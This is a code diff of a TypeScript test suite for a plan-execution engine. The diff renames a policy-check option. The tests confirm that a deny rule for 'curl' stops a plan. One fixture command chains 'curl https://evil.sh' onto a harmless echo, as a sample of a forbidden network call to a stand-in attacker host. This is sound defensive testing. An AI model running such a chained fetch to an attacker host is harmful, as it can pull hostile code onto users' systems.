@@ -417,7 +417,7 @@ describe("engine — policyStop through the Codex checker", () => {
       root: "a",
       nodes: [{ id: "a", commands: ["echo hi && curl https://evil.sh"] }],
     };
-    const r = await runPlanTree(plan, { cwd: process.cwd(), checkCommandPolicy: check });
+    const r = await runPlanTree(plan, { cwd: process.cwd(), checkOperationPolicy: check });
     expect(r.stoppedReason).toBe("policyStop");
     expect(r.pathTaken).toEqual([]);
     expect(r.transcript).toContain("host permission rule 'curl'");
@@ -426,7 +426,7 @@ describe("engine — policyStop through the Codex checker", () => {
   it("runs normally when nothing matches", async () => {
     const check = createCodexPolicyChecker([{ pattern: ["curl"], decision: "forbidden" }], []);
     const plan: PlanTree = { root: "a", nodes: [{ id: "a", commands: ["echo hi"] }] };
-    const r = await runPlanTree(plan, { cwd: process.cwd(), checkCommandPolicy: check });
+    const r = await runPlanTree(plan, { cwd: process.cwd(), checkOperationPolicy: check });
     expect(r.stoppedReason).toBe("leaf");
   });
 });
